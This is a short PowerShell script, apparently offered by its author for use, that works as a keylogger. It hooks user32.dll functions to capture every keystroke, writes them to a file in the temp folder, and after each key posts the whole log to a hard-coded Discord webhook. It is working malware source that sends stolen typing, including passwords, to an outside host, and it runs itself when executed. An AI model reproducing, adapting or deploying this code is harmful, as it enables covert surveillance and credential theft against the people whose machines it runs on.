# MADE BY SYKE
# Discord: syke#1166 / Syke#1166

# keylogger
function KeyLogger($logFile="$env:temp/keylogger.log") {

  # generate log file
  $generateLog = New-Item -Path $logFile -ItemType File -Force

  # API signatures
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

 # set up API
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru

  # attempt to log keystrokes
  try {
    while ($true) {
      Start-Sleep -Milliseconds 40

      for ($ascii = 9; $ascii -le 254; $ascii++) {

        # use API to get key state
        $keystate = $API::GetAsyncKeyState($ascii)

        # use API to detect keystroke
        if ($keystate -eq -32767) {
          $null = [console]::CapsLock

          # map virtual key
          $mapKey = $API::MapVirtualKey($ascii, 3)

          # create a stringbuilder
          $keyboardState = New-Object Byte[] 256
          $hideKeyboardState = $API::GetKeyboardState($keyboardState)
          $loggedchar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
            # add logged key to file
            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
            
            $webhookUri = 'https://discord.com/api/webhooks/941122393366204447/bqjN-dHZTcO1enFJ51U0XkPTlK_nHMrm7J8PTvxVnbisAlSZSXSFitnrJsqY6eN_tub9'
$Body = @{
  
  'content' = get-content $env:temp/keylogger.log
}
Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
          }
        }
      }
    }
  }
  




  
}

# run keylogger
KeyLogger
